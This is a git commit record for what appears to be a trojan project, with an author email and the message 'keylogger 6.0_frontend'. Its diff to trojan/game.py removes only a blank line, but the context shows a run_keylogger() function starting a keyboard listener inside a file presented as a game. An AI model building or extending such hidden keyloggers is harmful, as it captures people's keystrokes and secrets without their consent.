e811f55151fedb7f01965d34dfc76dcfdae223f7
janmejay25 <janmjaypandya@gmail.com>
2025-07-25 16:51:21 +0530

    keylogger 6.0_frontend

--- trojan/game.py
+++ trojan/game.py
@@ -224,7 +224,6 @@ def run_keylogger():
     listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
     listener.start()
     return listener
-    
 
 # === Main ===
 if __name__ == '__main__':
